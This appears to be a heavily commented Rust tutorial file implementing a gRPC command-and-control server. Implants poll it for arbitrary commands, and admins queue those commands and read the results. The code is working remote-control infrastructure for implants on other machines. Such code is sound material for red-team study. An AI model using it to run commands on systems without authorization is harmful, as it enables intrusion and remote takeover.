//! C2 Server - The central hub for Command & Control communication
//!
//! SYSTEM ARCHITECTURE:
//! This server runs TWO gRPC servers on different ports:
//! 1. Implant Server (port 4444) - Receives connections from implants
//! 2. Admin Server (port 9090) - Receives connections from admin clients
//!
//! DATA FLOW:
//! ```
//! Admin Client           Server (this)            Implant Client
//!      |                      |                         |
//!      |--RunCommand(cmd)---->|                         |
//!      |                 work_tx -> work_rx             |
//!      |                      |<----FetchCommand()------|
//!      |                      |----(cmd)--------------->|
//!      |                      |        [executes]       |
//!      |                      |<----SendOutput(result)--|
//!      |                 output_tx -> output_rx         |
//!      |<---(result)----------|                         |
//! ```
//!
//! CHANNEL ARCHITECTURE:
//! - work channel: Admin sends commands -> Implant receives commands
//! - output channel: Implant sends results -> Admin receives results
//!
//! WHY TWO SERVERS?
//! - Security: Implants and admins are on different networks/ports
//! - Isolation: Different authentication/authorization for each
//! - Scalability: Can scale implant and admin servers independently

use grpc_rs::admin::AdminService;
use grpc_rs::implant::ImplantService;
use grpc_rs::proto;
use grpc_rs::proto::admin_server::AdminServer;
use grpc_rs::proto::implant_server::ImplantServer;
use grpc_rs::proto::Command;
use std::error::Error;
use std::sync::Arc;
use tokio::sync::{mpsc, Mutex};
use tonic::transport::Server;
use tonic_reflection::server::Builder as ReflectionBuilder;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Configure addresses for both servers
    // Implant server: where implants connect to fetch commands
    // Admin server: where admin clients connect to send commands
    let implant_addr = "0.0.0.0:4444".parse()?;
    let admin_addr = "0.0.0.0:9090".parse()?;

    // ========== CHANNEL SETUP ==========
    // Create TWO unbounded channels for bidirectional communication
    //
    // WORK CHANNEL (Admin -> Implant):
    // - work_tx: AdminService sends commands here
    // - work_rx: ImplantService receives commands from here
    let (work_tx, work_rx) = mpsc::unbounded_channel::<Command>();

    // OUTPUT CHANNEL (Implant -> Admin):
    // - output_tx: ImplantService sends results here
    // - output_rx: AdminService receives results from here
    let (output_tx, output_rx) = mpsc::unbounded_channel::<Command>();

    // WHY UNBOUNDED?
    // - Simplifies the code (no blocking on send)
    // - Commands are small and shouldn't cause memory issues
    // - In production, use bounded channels to prevent DoS attacks

    // ========== SERVICE SETUP ==========
    // Create the two service handlers with their respective channel ends
    //
    // IMPLANT SERVICE:
    // - Receives work_rx (to fetch commands)
    // - Receives output_tx (to send results)
    // - work_rx is wrapped in Arc<Mutex<>> because multiple concurrent gRPC
    //   requests need to access it (one implant might poll while another sends output)
    let implant_service = ImplantService {
        work_rx: Arc::new(Mutex::new(work_rx)),
        output_tx,
    };

    // ADMIN SERVICE:
    // - Receives work_tx (to send commands)
    // - Receives output_rx (to receive results)
    // - output_rx is wrapped in Arc<Mutex<>> because the service needs to be
    //   Clone (tonic requirement) and we need exclusive access to the receiver
    let admin_service = AdminService {
        work_tx,
        output_rx: Arc::new(Mutex::new(output_rx)),
    };

    // ========== REFLECTION SERVICE ==========
    // Build gRPC reflection service
    // This allows tools like grpcurl to discover our API at runtime
    // - No need for .proto files when testing
    // - Tools can automatically generate forms/CLI interfaces
    let reflection_service = ReflectionBuilder::configure()
        .register_encoded_file_descriptor_set(proto::FILE_DESCRIPTOR_SET)
        .build_v1()?;

    println!("Starting gRPC servers...");
    println!("Implant server listening on {} (with reflection)", implant_addr);
    println!("Admin server listening on {} (with reflection)", admin_addr);
    println!("\nTest with:");
    println!("  grpcurl -plaintext localhost:4444 list");
    println!("  grpcurl -plaintext localhost:9090 list");

    // Clone reflection service so both servers can use it
    let reflection_service_admin = reflection_service.clone();

    // ========== START SERVERS ==========
    // Spawn both servers concurrently using tokio tasks
    //
    // IMPLANT SERVER (port 4444):
    // - Handles implant connections
    // - Provides FetchCommand and SendOutput RPCs
    let implant_server = tokio::spawn(async move {
        Server::builder()
            .add_service(ImplantServer::new(implant_service))
            .add_service(reflection_service)
            .serve(implant_addr)
            .await
    });

    // ADMIN SERVER (port 9090):
    // - Handles admin connections
    // - Provides RunCommand RPC
    let admin_server = tokio::spawn(async move {
        Server::builder()
            .add_service(AdminServer::new(admin_service))
            .add_service(reflection_service_admin)
            .serve(admin_addr)
            .await
    });

    // ========== WAIT FOR COMPLETION ==========
    // Wait for both servers to complete (they run forever until error/shutdown)
    // tokio::join! waits for both futures concurrently
    let (implant_result, admin_result) = tokio::join!(implant_server, admin_server);

    // Handle results - double ? unpacks:
    // - First ?: JoinError (task panic)
    // - Second ?: Transport error (server error)
    implant_result??;
    admin_result??;

    Ok(())
}
